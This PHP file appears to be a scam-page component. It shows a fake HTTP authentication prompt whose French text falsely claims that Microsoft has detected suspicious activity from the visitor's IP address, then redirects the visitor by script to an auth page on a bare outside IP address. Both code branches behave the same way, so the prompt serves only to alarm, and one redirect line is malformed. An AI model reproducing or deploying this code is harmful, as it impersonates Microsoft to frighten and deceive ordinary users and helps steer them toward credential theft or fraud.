<?php
if (!isset($_SERVER['PHP_AUTH_USER'])) {
	header('Content-Type: charset=utf-8');
	header('Content-Language: fr');
    header('WWW-Authenticate: Basic realm="Microsoft a détecté une activité suspecte à partir de votre adresse IP."');
    header('HTTP/1.0 401 Unauthorized');
	echo "<script>window.location.href=http://52.32.177.223/crm/fr/auth.php'</script>";
    exit;
} 
elseif(isset($_SERVER['PHP_AUTH_USER'])) {
	header('Content-Type: charset=utf-8');
	header('Content-Language: fr');
    header('WWW-Authenticate: Basic realm="Microsoft a détecté une activité suspecte à partir de votre adresse IP."');	
    header('HTTP/1.0 401 Unauthorized');
	echo "<script>window.location.href='http://52.32.177.223/crm/fr/auth.php'</script>";
    exit;
} 
?>
